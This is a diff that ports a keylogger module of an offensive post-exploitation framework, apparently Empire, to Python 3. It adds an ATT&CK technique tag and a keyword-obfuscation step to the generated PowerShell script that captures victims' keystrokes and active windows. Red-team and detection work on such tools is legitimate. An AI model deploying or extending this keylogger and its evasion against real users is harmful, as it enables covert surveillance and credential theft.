@@ -1,6 +1,12 @@
+from __future__ import print_function
+
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -10,6 +16,10 @@ class Module:
             'Author': ['@obscuresec', '@mattifestation', '@harmj0y'],
 
             'Description': ('Logs keys pressed, time and the active window (when changed) to the keystrokes.txt file. This file is located in the agents downloads directory Empire/downloads/<AgentName>/keystrokes.txt.'),
+
+            'Software': '',
+
+            'Techniques': ['T1056'],
 
             'Background' : True,
 
@@ -58,7 +68,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -68,7 +78,7 @@ class Module:
 
         scriptEnd = "Get-Keystrokes "
 
-        for option,values in self.options.iteritems():
+        for option,values in self.options.items():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
@@ -76,7 +86,10 @@ class Module:
                         scriptEnd += " -" + str(option)
                     else:
                         scriptEnd += " -" + str(option) + " " + str(values['Value'])
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
